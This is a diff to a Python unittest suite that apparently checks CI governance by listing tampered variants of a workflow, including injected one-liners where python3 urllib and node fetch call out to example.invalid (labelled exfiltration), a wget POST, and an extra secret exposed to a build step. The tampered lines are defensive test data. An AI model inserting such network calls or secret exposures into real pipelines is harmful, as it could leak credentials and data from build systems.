@@ -142,6 +142,12 @@ class StudioQaGovernanceTests(unittest.TestCase):
             ("ignored grep errors", 'test "$scan_status" -eq 1', 'test "$scan_status" -ne 0'),
             ("wget POST", 'echo STUDIO_QA_PROVIDER_AND_EDGE_EMPTY_PASS',
               'wget --post-data="{}" https://api.supabase.com/write; echo STUDIO_QA_PROVIDER_AND_EDGE_EMPTY_PASS'),
+            ("Python urllib exfiltration", "echo STUDIO_QA_PROVIDER_AND_EDGE_EMPTY_PASS",
+              'python3 -c "import urllib.request; urllib.request.urlopen(\'https://example.invalid\')" ; echo STUDIO_QA_PROVIDER_AND_EDGE_EMPTY_PASS'),
+            ("Node runtime fetch", "echo STUDIO_QA_PROVIDER_AND_EDGE_EMPTY_PASS",
+              'node -e "fetch(\'https://example.invalid\')" ; echo STUDIO_QA_PROVIDER_AND_EDGE_EMPTY_PASS'),
+            ("extra secret step env", "          SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}",
+              "          SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}\n          EXTRA_SECRET: ${{ secrets.EXTRA_SECRET }}"),
         ]
         for name, old, new in cases:
             self.assertIn(old, origin, name)
